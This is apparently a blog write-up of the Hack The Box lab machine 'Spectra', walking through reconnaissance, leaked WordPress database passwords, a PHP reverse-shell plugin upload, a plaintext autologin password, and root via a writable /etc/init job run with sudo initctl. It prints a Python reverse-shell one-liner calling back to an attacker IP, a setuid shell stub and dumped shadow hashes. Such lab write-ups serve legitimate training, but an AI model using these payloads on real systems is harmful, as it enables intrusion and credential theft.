---
layout: single
title: Spectra - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-03-02
classes: wide
header:
  teaser: /assets/images/htb-writeup-spectra/spectra_logo.png
  teaser_home_page: true
  icon: /assets/images/question-mark-white.png
categories:
  - hackthebox
  - infosec
tags:  
  - unknown os
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-spectra/spectra_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------

   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/spectra]# nmap -Pn -n -sCV --open 10.10.10.229
  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
  | ssh-hostkey:
  |_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
  80/tcp   open  http    nginx 1.17.4
  |_http-server-header: nginx/1.17.4
  |_http-title: Site doesn't have a title (text/html).
  3306/tcp open  mysql   MySQL (unauthorized)
  |_ssl-cert: ERROR: Script execution failed (use -d to debug)
  |_ssl-date: ERROR: Script execution failed (use -d to debug)
  |_sslv2: ERROR: Script execution failed (use -d to debug)
  |_tls-alpn: ERROR: Script execution failed (use -d to debug)
  |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

DIRB:
  ---- Entering directory: http://10.10.10.229/main/ ----
    + http://10.10.10.229/main/index.php (CODE:301|SIZE:0)
    ==> DIRECTORY: http://10.10.10.229/main/wp-admin/
    ==> DIRECTORY: http://10.10.10.229/main/wp-content/
    ==> DIRECTORY: http://10.10.10.229/main/wp-includes/
    + http://10.10.10.229/main/xmlrpc.php (CODE:405|SIZE:42)

  ---- Entering directory: http://10.10.10.229/main/wp-content/ ----
    + http://10.10.10.229/main/wp-content/index.php (CODE:200|SIZE:0)
    ==> DIRECTORY: http://10.10.10.229/main/wp-content/languages/
    ==> DIRECTORY: http://10.10.10.229/main/wp-content/plugins/
    ==> DIRECTORY: http://10.10.10.229/main/wp-content/themes/
    ==> DIRECTORY: http://10.10.10.229/main/wp-content/upgrade/
    ==> DIRECTORY: http://10.10.10.229/main/wp-content/uploads/

  ---- Entering directory: http://10.10.10.229/testing/ ----
    + http://10.10.10.229/testing/index.php (CODE:500|SIZE:2646)


NIKTO:
  + Server: nginx/1.17.4
  + Retrieved x-powered-by header: PHP/5.6.40

WPSCAN:
  + WordPress version 5.4.2
  + Theme twentynineteen
  + Theme twentyseventeen
  + Theme twentytwenty

2. Visiting http://10.10.10.229 we find; "Until IT set up the Jira we can configure and use this for issue tracking.", and two
links to 'Software Issue Tracker' (spectra.htb/main/index.php) and 'Test' (spectra.htb/testing/index.php).

TEST:
  + Database connection error
  + All files are listed when visiting http://spectra.htb/testing/, we find
  + http://spectra.htb/testing/wp-config.php.save shows it's configuration when inspecting the source code
    + DB_NAME: dev
    + DB_USER: devtest
    + DB_PASSWORD: devteam01
    + DB_HOST: localhost
    + table_prefix: wp_

  Finding the MySQL creds we can try to dump the database;
    [root:/git/htb/spectra]# mysqldump -h 10.10.10.229 dev wp_users -u devtest -p
      Enter password: devteam01
      mysqldump: Got error: 1130: "Host '10.10.14.12' is not allowed to connect to this MySQL server" when trying to connect

MAIN:
  + The main page have WordPress printed all over it
  + The welcome message is made by user Administrator
  + Admin login at http://10.10.10.229/main/wp-admin/

Use the found password to login on wp-admin (administrator:devteam01). Once logged in upload a php reverse shell as a plugin,
note that we will get a error saying: "The package could not be installed. PCLZIP_ERR_BAD_FORMAT (-10)". However, the file
will still be uploaded and reachable through 'http://10.10.10.229/main/wp-content/uploads/<YEAR>/<MONTH>/rev.php'

Setup a local listener and visit 'http://10.10.10.229/main/wp-content/uploads/2021/05/rev.php'

  [root:/git/htb/spectra]# nc -lvnp 4488
    listening on [any] 4488 ...
    connect to [10.10.14.12] from (UNKNOWN) [10.10.10.229] 41986
    Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux
     00:23:28 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00
    USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
    $ pwd
      /
    $ ls -al /home
      total 32
      drwxr-xr-x  8 root    root    4096 Feb  2 15:55 .
      drwxr-xr-x 22 root    root    4096 Feb  2 14:52 ..
      drwx------  4 root    root    4096 Jul 20  2020 .shadow
      drwxr-xr-x 20 chronos chronos 4096 May 10 23:35 chronos
      drwxr-xr-x  4 katie   katie   4096 Feb 10 00:38 katie
      drwxr-xr-x  5 nginx   nginx   4096 Feb  4 12:41 nginx
      drwxr-x--t  4 root    root    4096 Jul 20  2020 root
      drwxr-xr-x  4 root    root    4096 Jul 20  2020 user


3. When first getting access to wp-admin we did it through one of the wp-config-files, however we could not reach the other one.
Maybe there's another set of creds there. To find the location of the web directory we can search for 'wordpress' using find.

  nginx@spectra / $ find . -name wordpress 2> >(grep -v 'Permission denied' >&2)
    ./usr/local/share/nginx/html/main/wp-includes/js/tinymce/plugins/wordpress

  nginx@spectra /usr/local/share/nginx/html/testing $ cat wp-config.php
    define( 'DB_NAME', 'dev' );
    define( 'DB_USER', 'devtest' );
    define( 'DB_PASSWORD', 'devteam01' );

Same creds unfortunately. But how about the main page's wp-config.php?

  nginx@spectra /usr/local/share/nginx/html/main $ cat wp-config.php
    define( 'DB_NAME', 'dev' );
    define( 'DB_USER', 'dev' );
    define( 'DB_PASSWORD', 'development01' );
    $table_prefix = 'wp_';

The password is not reused for any of the user accounts, so seems like this is a dead end as well. Check if there are any
other services running locally on the system.


  nginx@spectra /dev/shm $ chmod +x linpeas.sh
  nginx@spectra /dev/shm $ ./linpeas.sh
    bash: ./linpeas.sh: Permission denied

  nginx@spectra /tmp $ bash linpeas.sh
    [+] Active Ports
    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -

From linpeas we find nothing really useful, only that there are some service running on port 9000 locally that we can't reach.
This next step took me a few hours, but then finally I found;

  nginx@spectra /opt $ cat autologin.conf.orig
    # Copyright 2016 The Chromium OS Authors. All rights reserved.
    # Use of this source code is governed by a BSD-style license that can be
    # found in the LICENSE file.
    description   "Automatic login at boot"
    author        "chromium-os-dev@chromium.org"
    # After boot-complete starts, the login prompt is visible and is accepting
    # input.
    start on started boot-complete
    script
      passwd=
      # Read password from file. The file may optionally end with a newline.
      for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
        if [ -e "${dir}/passwd" ]; then
          passwd="$(cat "${dir}/passwd")"
          break
        fi
      done
      if [ -z "${passwd}" ]; then
        exit 0
      fi
      # Inject keys into the login prompt.
      #
      # For this to work, you must have already created an account on the device.
      # Otherwise, no login prompt appears at boot and the injected keys do the
      # wrong thing.
      /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter

Analysing the script we see that 'Read password from file' /etc/autologin/passwd.
  nginx@spectra /opt $ cat /etc/autologin/passwd
    SummerHereWeCome!!


4. Try the password on our different users (katie:SummerHereWeCome!! is correct) and grab user.txt.

  [root:/git/htb/spectra]# ssh katie@spectra.htb
    Password: SummerHereWeCome!!
    katie@spectra ~ $ id
      uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
    katie@spectra ~ $ cat user.txt
      e89d27fe195e9114ffa72ba8913a6130



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. As usual, we try 'sudo -l' to see if we can grab a easy root.

  katie@spectra ~ $ sudo -l
    User katie may run the following commands on spectra:
        (ALL) SETENV: NOPASSWD: /sbin/initctl

initctl handles all startup scripts, which are stored in /etc/init/. We don't have any write access to the folder, however there
are 10 test.conf-file that we have write permissions over.

  katie@spectra /etc/init $ ls -al
    -rw-rw----  1 root developers   478 Jun 29  2020 test.conf
    -rw-rw----  1 root developers   478 Jun 29  2020 test1.conf
    -rw-rw----  1 root developers   478 Jun 29  2020 test10.conf
    -rw-rw----  1 root developers   478 Jun 29  2020 test2.conf
    -rw-rw----  1 root developers   478 Jun 29  2020 test3.conf
    -rw-rw----  1 root developers   478 Jun 29  2020 test4.conf
    -rw-rw----  1 root developers   478 Jun 29  2020 test5.conf
    -rw-rw----  1 root developers   478 Jun 29  2020 test6.conf
    -rw-rw----  1 root developers   478 Jun 29  2020 test7.conf
    -rw-rw----  1 root developers   478 Jun 29  2020 test8.conf
    -rw-rw----  1 root developers   478 Jun 29  2020 test9.conf


Create a malicious script that will start a new shell:
  katie@spectra ~ $ cat pwn.c
    int main()
    {
         setgid(0);
         setuid(0);
         system("/bin/bash");
    }

Note that the privs are nothing special:
  katie@spectra ~ $ ls -al
    -rw-r--r-- 1 katie katie   73 May 11 02:57 pwn.c

Edit one of the /etc/init/conf-scripts to setuid and chown the malicious script as root:
  katie@spectra /etc/init $ cat test.conf
    description "Setuid pwn.c PrivEsc"
    author      "PlayerThree"

    start on filesystem or runlevel [2345]
    stop on shutdown

    script

      chown root:root /home/katie/pwn.c
      chmod 4755 /home/katie/pwn.c

    end script

Run the script:
  katie@spectra ~ $ sudo /sbin/initctl start test
    test start/running, process 40624

Note how the privs have changed, we should now be able to trigger a root shell:
  katie@spectra ~ $ ls -al
    -rwsr-xr-x 1 root  root   114 May 11 03:32 pwn.c

  katie@spectra ~ $ ./pwn.c
    -bash: ./pwn.c: Permission denied

  katie@spectra ~ $ bash pwn.c
    pwn.c: warning: pwn.c: warning: script from noexec mount; see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
    pwn.c: line 4: syntax error near unexpected token `('
    pwn.c: line 4: `int main()'


2. Because of noexec we can trigger the script using normal './', and it seems like the c-syntax isn't working. Instead we can
try to directly throw different reverse one-liners into the startup script /etc/init/test.conf.

  katie@spectra ~ $ cat /etc/init/test.conf
    description "Root Reverse PrivEsc"
    author      "PlayerThree"

    start on filesystem or runlevel [2345]
    stop on shutdown

    script

    	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4488));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    end script

  katie@spectra ~ $ sudo /sbin/initctl start test
    test start/running, process 41762

  [root:/git/htb/spectra]# nc -lvnp 4488
    listening on [any] 4488 ...
    connect to [10.10.14.12] from (UNKNOWN) [10.10.10.229] 42060
    # id
      uid=0(root) gid=0(root) groups=0(root)
    # cat /root/root.txt
      d44519713b889d5e1f9e536d0c6df2fc

    # cat /etc/shadow
      root:$1$lchcuPsn$BgyskySIi0hFMF4/v7S53.:18661::::::
      chronos:*:::::::
      nginx:!:18660:0:99999:7:::
      katie:$1$IL2kvPV1$mYHaoPio5/jIZ.JL/RLr2/:18662:0:99999:7:::


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Startup script exploit, /etc/init:
  https://recipeforroot.com/exploiting-startup-scripts/
  https://www.doyler.net/security-not-included/exploiting-init-d-fun-profit
